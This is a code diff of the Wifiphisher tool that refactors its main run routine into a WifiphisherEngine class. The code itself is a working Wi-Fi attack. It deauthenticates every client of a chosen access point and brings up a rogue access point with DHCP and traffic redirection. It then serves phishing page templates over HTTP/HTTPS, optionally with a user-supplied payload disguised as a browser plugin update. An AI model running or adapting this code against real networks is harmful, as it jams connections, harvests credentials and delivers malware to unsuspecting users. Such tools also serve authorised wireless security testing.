@@ -642,224 +642,237 @@ def kill_interfering_procs():
         time.sleep(1)
 
 
-def run():
+class WifiphisherEngine:
 
-    print ('[' + T + '*' + W + '] Starting Wifiphisher %s at %s' %
-           (VERSION, time.strftime("%Y-%m-%d %H:%M")))
+    def __init__(self):
+        pass
 
-    # Parse args
-    global args, APs, mon_MAC, mac_matcher
-    args = parse_args()
+    def start(self):
+        # Parse args
+        global args, APs, mon_MAC, mac_matcher
+        args = parse_args()
 
-    # Check args
-    check_args(args)
+        # Check args
+        check_args(args)
 
-    # Are you root?
-    if os.geteuid():
-        sys.exit('[' + R + '-' + W + '] Please run as root')
+        # Are you root?
+        if os.geteuid():
+            sys.exit('[' + R + '-' + W + '] Please run as root')
 
-    # TODO: We should have more checks here:
-    # Is anything binded to our HTTP(S) ports?
-    # Maybe we should save current iptables rules somewhere
+        # TODO: We should have more checks here:
+        # Is anything binded to our HTTP(S) ports?
+        # Maybe we should save current iptables rules somewhere
 
-    network_manager = interfaces.NetworkManager()
-    mac_matcher = macmatcher.MACMatcher(MAC_PREFIX_FILE)
-    fw = firewall.Fw()
+        network_manager = interfaces.NetworkManager()
+        mac_matcher = macmatcher.MACMatcher(MAC_PREFIX_FILE)
+        fw = firewall.Fw()
 
-    # get interfaces for monitor mode and AP mode and set the monitor interface
-    # to monitor mode. shutdown on any errors
-    try:
-        if args.internetinterface:
-           internet_interface = network_manager.set_internet_iface(args.internetinterface)
-        if not args.nojamming:
-            if args.jamminginterface and args.apinterface:
-                mon_iface = network_manager.get_jam_iface(
-                    args.jamminginterface)
-                ap_iface = network_manager.get_ap_iface(args.apinterface)
+        # get interfaces for monitor mode and AP mode and set the monitor interface
+        # to monitor mode. shutdown on any errors
+        try:
+            if args.internetinterface:
+               internet_interface = network_manager.set_internet_iface(args.internetinterface)
+            if not args.nojamming:
+                if args.jamminginterface and args.apinterface:
+                    mon_iface = network_manager.get_jam_iface(
+                        args.jamminginterface)
+                    ap_iface = network_manager.get_ap_iface(args.apinterface)
+                else:
+                    mon_iface, ap_iface = network_manager.find_interface_automatically()
+                network_manager.set_jam_iface(mon_iface.get_name())
+                network_manager.set_ap_iface(ap_iface.get_name())
+                # display selected interfaces to the user
+                print ("[{0}+{1}] Selecting {0}{2}{1} interface for the deauthentication "
+                       "attack\n[{0}+{1}] Selecting {0}{3}{1} interface for creating the "
+                       "rogue Access Point").format(G, W, mon_iface.get_name(), ap_iface.get_name())
             else:
-                mon_iface, ap_iface = network_manager.find_interface_automatically()
-            network_manager.set_jam_iface(mon_iface.get_name())
-            network_manager.set_ap_iface(ap_iface.get_name())
-            # display selected interfaces to the user
-            print ("[{0}+{1}] Selecting {0}{2}{1} interface for the deauthentication "
-                   "attack\n[{0}+{1}] Selecting {0}{3}{1} interface for creating the "
-                   "rogue Access Point").format(G, W, mon_iface.get_name(), ap_iface.get_name())
-        else:
-            if args.apinterface:
-                ap_iface = network_manager.get_ap_iface(
-                    interface_name=args.apinterface)
-            else:
-                ap_iface = network_manager.get_ap_iface()
-            mon_iface = ap_iface
-            network_manager.set_ap_iface(ap_iface.get_name())
-            print ("[{0}+{1}] Selecting {0}{2}{1} interface for creating the "
-                   "rogue Access Point").format(G, W, ap_iface.get_name())
+                if args.apinterface:
+                    ap_iface = network_manager.get_ap_iface(
+                        interface_name=args.apinterface)
+                else:
+                    ap_iface = network_manager.get_ap_iface()
+                mon_iface = ap_iface
+                network_manager.set_ap_iface(ap_iface.get_name())
+                print ("[{0}+{1}] Selecting {0}{2}{1} interface for creating the "
+                       "rogue Access Point").format(G, W, ap_iface.get_name())
 
-        kill_interfering_procs()
-        network_manager.set_interface_mode(mon_iface, "monitor")
-    except (interfaces.NotEnoughInterfacesFoundError,
-            interfaces.JammingInterfaceInvalidError,
-            interfaces.ApInterfaceInvalidError,
-            interfaces.NoApInterfaceFoundError,
-            interfaces.NoMonitorInterfaceFoundError) as err:
-        print ("[{0}!{1}] " + str(err)).format(R, W)
-        time.sleep(2)
-        shutdown()
-
-    if args.internetinterface:
-        fw.nat(ap_iface.get_name(), args.internetinterface)
-        set_ip_fwd()
-    else:
-        fw.redirect_requests_localhost()
-    set_route_localnet()
-
-    if not args.internetinterface:
-        network_manager.up_ifaces([ap_iface, mon_iface])
-
-    print '[' + T + '*' + W + '] Cleared leases, started DHCP, set up iptables'
-
-    if args.essid:
-        essid = args.essid
-        channel = str(CHANNEL)
-        ap_mac = None
-        enctype = None
-    else:
-        # let user choose access point
-        access_point = curses.wrapper(select_access_point, mon_iface)
-
-        # if the user has chosen a access point continue
-        # otherwise shutdown
-        if access_point:
-            # store choosen access point's information
-            essid = access_point.get_name()
-            channel = access_point.get_channel()
-            ap_mac = access_point.get_mac_address()
-            enctype = access_point.get_encryption()
-        else:
+            kill_interfering_procs()
+            network_manager.set_interface_mode(mon_iface, "monitor")
+        except (interfaces.NotEnoughInterfacesFoundError,
+                interfaces.JammingInterfaceInvalidError,
+                interfaces.ApInterfaceInvalidError,
+                interfaces.NoApInterfaceFoundError,
+                interfaces.NoMonitorInterfaceFoundError) as err:
+            print ("[{0}!{1}] " + str(err)).format(R, W)
+            time.sleep(2)
             shutdown()
-    # create a template manager object
-    template_manager = phishingpage.TemplateManager()
-    # get the correct template
-    template = select_template(args.phishingscenario, template_manager)
 
-    print ("[" + G + "+" + W + "] Selecting " + template.get_display_name() +
-           " template")
+        if args.internetinterface:
+            fw.nat(ap_iface.get_name(), args.internetinterface)
+            set_ip_fwd()
+        else:
+            fw.redirect_requests_localhost()
+        set_route_localnet()
 
-    # payload selection for browser plugin update
-    if template.has_payload():
-        payload_path = False
-        # copy payload to update directory
-        while not payload_path or not os.path.isfile(payload_path):
-            # get payload path
-            payload_path = raw_input("[" + G + "+" + W +
-                                     "] Enter the [" + G + "full path" + W +
-                                     "] to the payload you wish to serve: ")
-            if not os.path.isfile(payload_path):
-                print '[' + R + '-' + W + '] Invalid file path!'
-        print '[' + T + '*' + W + '] Using ' + G + payload_path + W + ' as payload '
-        copyfile(payload_path, PHISHING_PAGES_DIR +
-                 template.get_payload_path())
+        if not args.internetinterface:
+            network_manager.up_ifaces([ap_iface, mon_iface])
 
-    APs_context = []
-    for i in APs:
-        APs_context.append({
-            'channel': APs[i][0] or "",
-            'essid': APs[i][1] or "",
-            'bssid': APs[i][2] or "",
-            'vendor': mac_matcher.get_vendor_name(APs[i][2]) or ""
+        print '[' + T + '*' + W + '] Cleared leases, started DHCP, set up iptables'
+
+        if args.essid:
+            essid = args.essid
+            channel = str(CHANNEL)
+            ap_mac = None
+            enctype = None
+        else:
+            # let user choose access point
+            access_point = curses.wrapper(select_access_point, mon_iface)
+
+            # if the user has chosen a access point continue
+            # otherwise shutdown
+            if access_point:
+                # store choosen access point's information
+                essid = access_point.get_name()
+                channel = access_point.get_channel()
+                ap_mac = access_point.get_mac_address()
+                enctype = access_point.get_encryption()
+            else:
+                shutdown()
+        # create a template manager object
+        template_manager = phishingpage.TemplateManager()
+        # get the correct template
+        template = select_template(args.phishingscenario, template_manager)
+
+        print ("[" + G + "+" + W + "] Selecting " + template.get_display_name() +
+               " template")
+
+        # payload selection for browser plugin update
+        if template.has_payload():
+            payload_path = False
+            # copy payload to update directory
+            while not payload_path or not os.path.isfile(payload_path):
+                # get payload path
+                payload_path = raw_input("[" + G + "+" + W +
+                                         "] Enter the [" + G + "full path" + W +
+                                         "] to the payload you wish to serve: ")
+                if not os.path.isfile(payload_path):
+                    print '[' + R + '-' + W + '] Invalid file path!'
+            print '[' + T + '*' + W + '] Using ' + G + payload_path + W + ' as payload '
+            copyfile(payload_path, PHISHING_PAGES_DIR +
+                     template.get_payload_path())
+
+        APs_context = []
+        for i in APs:
+            APs_context.append({
+                'channel': APs[i][0] or "",
+                'essid': APs[i][1] or "",
+                'bssid': APs[i][2] or "",
+                'vendor': mac_matcher.get_vendor_name(APs[i][2]) or ""
+            })
+
+        template.merge_context({'APs': APs_context})
+
+        # only get logo path if MAC address is present
+        ap_logo_path = False
+        if ap_mac:
+            ap_logo_path = template.use_file(mac_matcher.get_vendor_logo_path(ap_mac))
+
+        template.merge_context({
+            'target_ap_channel': channel or "",
+            'target_ap_essid': essid or "",
+            'target_ap_bssid': ap_mac or "",
+            'target_ap_encryption': enctype or "",
+            'target_ap_vendor': mac_matcher.get_vendor_name(ap_mac) or "",
+            'target_ap_logo_path': ap_logo_path or ""
         })
 
-    template.merge_context({'APs': APs_context})
+        # We want to set this now for hostapd. Maybe the interface was in "monitor"
+        # mode for network discovery before (e.g. when --nojamming is enabled).
+        network_manager.set_interface_mode(ap_iface, "managed")
+        # Start AP
+        start_ap(ap_iface.get_name(), channel, essid, args)
+        dhcpconf = dhcp_conf(ap_iface.get_name())
+        if not dhcp(dhcpconf, ap_iface.get_name()):
+            print('[' + G + '+' + W +
+                  '] Could not set IP address on %s!' % ap_iface.get_name()
+                  )
+            shutdown(template=template)
+        subprocess.call('clear', shell=True)
+        print ('[' + T + '*' + W + '] ' + T +
+               essid + W + ' set up on channel ' +
+               T + channel + W + ' via ' + T + mon_iface.get_name() +
+               W + ' on ' + T + str(ap_iface.get_name()) + W)
 
-    # only get logo path if MAC address is present
-    ap_logo_path = False
-    if ap_mac:
-        ap_logo_path = template.use_file(mac_matcher.get_vendor_logo_path(ap_mac))
+        # With configured DHCP, we may now start the web server
+        if not args.internetinterface:
+        # Start HTTP server in a background thread
+            print '[' + T + '*' + W + '] Starting HTTP/HTTPS server at ports ' + str(PORT) + ", " + str(SSL_PORT)
+            webserver = Thread(target=phishinghttp.runHTTPServer,
+                               args=(NETWORK_GW_IP, PORT, SSL_PORT, template))
+            webserver.daemon = True
+            webserver.start()
 
-    template.merge_context({
-        'target_ap_channel': channel or "",
-        'target_ap_essid': essid or "",
-        'target_ap_bssid': ap_mac or "",
-        'target_ap_encryption': enctype or "",
-        'target_ap_vendor': mac_matcher.get_vendor_name(ap_mac) or "",
-        'target_ap_logo_path': ap_logo_path or ""
-    })
+            time.sleep(1.5)
 
-    # We want to set this now for hostapd. Maybe the interface was in "monitor"
-    # mode for network discovery before (e.g. when --nojamming is enabled).
-    network_manager.set_interface_mode(ap_iface, "managed")
-    # Start AP
-    start_ap(ap_iface.get_name(), channel, essid, args)
-    dhcpconf = dhcp_conf(ap_iface.get_name())
-    if not dhcp(dhcpconf, ap_iface.get_name()):
-        print('[' + G + '+' + W +
-              '] Could not set IP address on %s!' % ap_iface.get_name()
-              )
-        shutdown(template=template)
-    subprocess.call('clear', shell=True)
-    print ('[' + T + '*' + W + '] ' + T +
-           essid + W + ' set up on channel ' +
-           T + channel + W + ' via ' + T + mon_iface.get_name() +
-           W + ' on ' + T + str(ap_iface.get_name()) + W)
+        # We no longer need mac_matcher
+        mac_matcher.unbind()
 
-    # With configured DHCP, we may now start the web server
-    if not args.internetinterface:
-    # Start HTTP server in a background thread
-        print '[' + T + '*' + W + '] Starting HTTP/HTTPS server at ports ' + str(PORT) + ", " + str(SSL_PORT)
-        webserver = Thread(target=phishinghttp.runHTTPServer,
-                           args=(NETWORK_GW_IP, PORT, SSL_PORT, template))
-        webserver.daemon = True
-        webserver.start()
+        clients_APs = []
+        APs = []
+        mon_MAC = mon_mac(mon_iface.get_name())
 
-        time.sleep(1.5)
+        deauthentication = None
+        if not args.nojamming:
+            monchannel = channel
+            # set the channel on the deauthenticating interface
+            mon_iface.set_channel(int(channel))
 
-    # We no longer need mac_matcher
-    mac_matcher.unbind()
+            # start deauthenticating all client on target access point
+            deauthentication = deauth.Deauthentication(ap_mac,
+                                                       mon_iface.get_name())
+            deauthentication.deauthenticate()
 
-    clients_APs = []
-    APs = []
-    mon_MAC = mon_mac(mon_iface.get_name())
+        # Main loop.
+        try:
+            term = Terminal()
+            with term.fullscreen():
+                while 1:
+                    term.clear()
+                    with term.hidden_cursor():
+                        print term.move(0, term.width - 30) + "|"
+                        print term.move(1, term.width - 30) + "|" + " " + term.bold_blue("Wifiphisher " + VERSION)
+                        print term.move(2, term.width - 30) + "|" + " ESSID: " + essid
+                        print term.move(3, term.width - 30) + "|" + " Channel: " + channel
+                        print term.move(4, term.width - 30) + "|" + " AP interface: " + ap_iface.get_name()
+                        print term.move(5, term.width - 30) + "|" + "_"*29
+                        print term.move(1, 0) + term.blue("Deauthenticating clients: ")
+                        if not args.nojamming:
+                            # only show clients when jamming
+                            if deauthentication.get_clients():
+                                # show the 5 most recent devices
+                                for client in deauthentication.get_clients()[-5:]:
+                                    print client
+                        print term.move(9,0) + term.blue("DHCP Leases: ")
+                        if os.path.isfile('/var/lib/misc/dnsmasq.leases'):
+                            proc = check_output(['tail', '-5', '/var/lib/misc/dnsmasq.leases'])
+                            print term.move(10,0) + proc
+                        print term.move(17,0) + term.blue("HTTP requests: ")
+                        if os.path.isfile('/tmp/wifiphisher-webserver.tmp'):
+                            proc = check_output(['tail', '-5', '/tmp/wifiphisher-webserver.tmp'])
+                            print term.move(18,0) + proc
+                        if phishinghttp.terminate and args.quitonsuccess:
+                            raise KeyboardInterrupt
+        except KeyboardInterrupt:
+            shutdown(deauthentication, template_manager, network_manager)
 
-    deauthentication = None
-    if not args.nojamming:
-        monchannel = channel
-        # set the channel on the deauthenticating interface
-        mon_iface.set_channel(int(channel))
 
-        # start deauthenticating all client on target access point
-        deauthentication = deauth.Deauthentication(ap_mac,
-                                                   mon_iface.get_name())
-        deauthentication.deauthenticate()
-
-    # Main loop.
+def run():
     try:
-        term = Terminal()
-        with term.fullscreen():
-            while 1:
-                term.clear()
-                with term.hidden_cursor():
-                    print term.move(0, term.width - 30) + "|"
-                    print term.move(1, term.width - 30) + "|" + " " + term.bold_blue("Wifiphisher " + VERSION)
-                    print term.move(2, term.width - 30) + "|" + " ESSID: " + essid
-                    print term.move(3, term.width - 30) + "|" + " Channel: " + channel
-                    print term.move(4, term.width - 30) + "|" + " AP interface: " + ap_iface.get_name()
-                    print term.move(5, term.width - 30) + "|" + "_"*29
-                    print term.move(1, 0) + term.blue("Deauthenticating clients: ")
-                    if not args.nojamming:
-                        # only show clients when jamming
-                        if deauthentication.get_clients():
-                            # show the 5 most recent devices
-                            for client in deauthentication.get_clients()[-5:]:
-                                print client
-                    print term.move(9,0) + term.blue("DHCP Leases: ")
-                    if os.path.isfile('/var/lib/misc/dnsmasq.leases'):
-                        proc = check_output(['tail', '-5', '/var/lib/misc/dnsmasq.leases'])
-                        print term.move(10,0) + proc
-                    print term.move(17,0) + term.blue("HTTP requests: ")
-                    if os.path.isfile('/tmp/wifiphisher-webserver.tmp'):
-                        proc = check_output(['tail', '-5', '/tmp/wifiphisher-webserver.tmp'])
-                        print term.move(18,0) + proc
-                    if phishinghttp.terminate and args.quitonsuccess:
-                        raise KeyboardInterrupt
+        print ('[' + T + '*' + W + '] Starting Wifiphisher %s at %s' %
+            (VERSION, time.strftime("%Y-%m-%d %H:%M")))
+        engine = WifiphisherEngine()
+        engine.start()
     except KeyboardInterrupt:
-        shutdown(deauthentication, template_manager, network_manager)
+        print R + '\n (^C)' + O + ' interrupted\n' + W
+    except EOFError:
+        print R + '\n (^D)' + O + ' interrupted\n' + W
